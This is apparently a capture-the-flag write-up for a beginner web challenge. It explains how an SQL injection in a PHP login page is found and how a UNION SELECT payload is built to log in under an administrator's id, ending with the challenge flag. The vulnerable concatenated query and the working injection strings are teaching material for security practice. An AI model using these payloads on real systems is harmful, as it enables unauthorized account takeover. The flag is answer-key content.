---
title: "I am the admin now"
description: "RISC intro2web challenge 6"
pubDate: "Aug 27 2025"
heroImage: "/hero/RISC.webp"
tags: ["cyber", "python", "sql", "php", "ctf", "exploit"]
---

###### [Canonical > RISC](https://writeups.urisc.club/web/6_i_am_the_admin_now/)

## Challenge description

/admin.php is heavily locked down, not allowing anyone to see it except for administrators! There's definitely no way to bypass this.

---

## Approach

Looking through the page's source code, we can find that there is an SQL injection vulnerability in `login.php`:

```php
$sql = "SELECT id, password, fullname FROM users WHERE username = '$username' LIMIT 1";
```

Since the username is concatenated directly into the SQL, we can add in our own SQL to be executed.

We can confirm this by entering `'--` as our username and we get a `mysqli_sql_exception`.

Since the username is near the end of the query, we can't modify any of the preceding SQL, so instead we will try to make it redundant.

Lets look at our query.

```sql
SELECT id, password, fullname FROM users WHERE username = 'index' LIMIT 1
```

> 'index' being my username

If we inject `' UNION SELECT id, password, fullname FROM users WHERE username = index` the sql becomes:

```sql
SELECT id, password, fullname FROM users WHERE username = ''
UNION
SELECT id, password, fullname FROM users WHERE username = index LIMIT 1
```

This combines the result of the first query with the result of the second query. The first query's username is blank so it will return nothing making the query now return solely what our injected half requests.

Now we need to adjust our query to get us admin access.

Looking back at the source code we find the admin page uses the id to authenticate:

```php
$stmt = $conn->prepare("SELECT is_admin, fullname, username FROM users WHERE id = ?");
```

So if we can get our user id to be one of an admin, we can get access to the page.

### The Injection

```sql
' UNION SELECT (SELECT id FROM users WHERE is_admin = 1 LIMIT 1), password, fullname FROM users WHERE username = 'index
```

If we enter the injection as our username, and enter our password, we successfully login.

Navigating to `admin.php` we find our flag waiting for us:

> Administrator Access Granted.
>
> Flag: RISC{look_at_me_i_am_the_admin_now_4f2f48aca573e2d79b4dc8f2ee047658}

Our flag is:

```
RISC{look_at_me_i_am_the_admin_now_4f2f48aca573e2d79b4dc8f2ee047658}
```
